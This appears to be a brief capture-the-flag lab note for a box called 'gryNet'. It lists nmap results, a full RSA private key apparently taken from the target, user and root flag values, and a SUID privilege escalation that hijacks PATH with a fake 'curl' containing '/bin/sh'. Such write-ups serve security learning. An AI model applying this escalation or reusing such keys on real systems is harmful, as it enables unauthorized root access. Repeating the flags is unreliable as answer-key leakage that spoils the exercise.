2022-06-26 
# gryNet

IP=::

Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-26 20:52 CEST
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4PeD0e0522UEj7xlrLmN68R6iSG3HMK/aTI812CTtzM9gnXs
qpweZL+GJBB59bSG3RTPtirC3M9YNTDsuTvxw9Y/+NuUGJIq5laQZS5e2RaqI1nv
U7fXEQlJrrlWfCy9VDTlgB/KRxKerqc42aU+/BrSyYqImpN6AgoNm/s/753DEPJt
dwsr45KFJOhtaIPA4EoZAq8pKovdSFteeUHikosUQzgqvSCv1RH8ZYBTwslxSorW
y3fXs5GwjitvRnQEVTO/GZomGV8UhjrT3TKbPhiwOy5YA484Lp3ES0uxKJEnKdSt
otHFT4i1hXq6T0CvYoaEpL7zCq7udl7KcZ0zfwIDAQABAoIBAEDl5nc28kviVnCI
ruQnG1P6eEb7HPIFFGbqgTa4u6RL+eCa2E1XgEUcIzxgLG6/R3CbwlgQ+entPssJ
dCDztAkE06uc3JpCAHI2Yq1ttRr3ONm95hbGoBpgDYuEF/j2hx+1qsdNZHMgYfqM
bxAKZaMgsdJGTqYZCUdxUv++eXFMDTTw/h2SCAuPE2Nb1f1537w/UQbB5HwZfVry
tRHknh1hfcjh4ZD5x5Bta/THjjsZo1kb/UuX41TKDFE/6+Eq+G9AvWNC2LJ6My36
YfeRs89A1Pc2XD08LoglPxzR7Hox36VOGD+95STWsBViMlk2lJ5IzU9XVIt3EnCl
bUI7DNECgYEA8ZymxvRV7yvDHHLjw5Vj/puVIQnKtadmE9H9UtfGV8gI/NddE66e
t8uIhiydcxE/u8DZd+mPt1RMU9GeUT5WxZ8MpO0UPVPIRiSBHnyu+0tolZSLqVul
rwT/nMDCJGQNaSOb2kq+Y3DJBHhlOeTsxAi2YEwrK9hPFQ5btlQichMCgYEA7l0c
dd1mwrjZ51lWWXvQzOH0PZH/diqXiTgwD6F1sUYPAc4qZ79blloeIhrVIj+isvtq
mgG2GD0TWueNnddGafwIp3USIxZOcw+e5hHmxy0KHpqstbPZc99IUQ5UBQHZYCvl
SR+ANdNuWpRTD6gWeVqNVni9wXjKhiKM17p3RmUCgYEAp6dwAvZg+wl+5irC6WCs
dmw3WymUQ+DY8D/ybJ3Vv+vKcMhwicvNzvOo1JH433PEqd/0B0VGuIwCOtdl6DI9
u/vVpkvsk3Gjsyh5gFI8iZuWAtWE5Av4OC5bwMXw8ZeLxr0y1JKw8ge9NSDl/Pph
YNY61y+DdXUvywifkzFmhYkCgYB6TeZbh9XBVg3gyhMnaQNzDQFAUlhM7n/Alcb7
TjJQWo06tOlHQIWi+Ox7PV9c6l/2DFDfYr9nYnc67pLYiWwE16AtJEHBJSHtofc7
P7Y1PqPxnhW+SeDqtoepp3tu8kryMLO+OF6Vv73g1jhkUS/u5oqc8ukSi4MHHlU8
H94xjQKBgExhzreYXCjK9FswXhUU9avijJkoAsSbIybRzq1YnX0gSewY/SB2xPjF
S40wzYviRHr/h0TOOzXzX8VMAQx5XnhZ5C/WMhb0cMErK8z+jvDavEpkMUlR+dWf
Py/CLlDCU4e+49XBAPKEmY4DuN+J2Em/tCz7dzfCNS/mpsSEn0jo
-----END RSA PRIVATE KEY-----



user.txt : d0b0f3f53b6caa532a83915e19224899
find / -perm -u=s -type f 2>/dev/null
# /usr/bin/menu
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
1

>

root.txt : 177b3cd8562289f37382721c28381f02